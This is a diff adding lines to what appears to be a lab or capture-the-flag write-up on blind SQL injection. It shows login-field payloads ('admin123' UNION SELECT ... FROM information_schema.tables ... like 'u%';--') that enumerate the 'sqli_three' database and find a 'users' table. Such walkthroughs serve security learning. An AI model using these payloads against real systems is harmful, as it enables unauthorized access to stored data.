@@ -89,3 +89,11 @@ Now that our number of columns has been established, we can work on the  enumera
     admin123' UNION SELECT 1,2,3 where database() like 's%';-- 
 ![Get db name](images/20-get-database-name.png)<br/>
 After many tryed i've found full database name, which is `sqli_three`<br/>
+
+Now we need to enumerate `table names` using a similar method.
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
+![table name](images/21-table-name.png)<br/>
+
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+![full table name](images/22-full-table-name.png)<br/>
+After many tryed i've found full table name, which is `users`<br/>
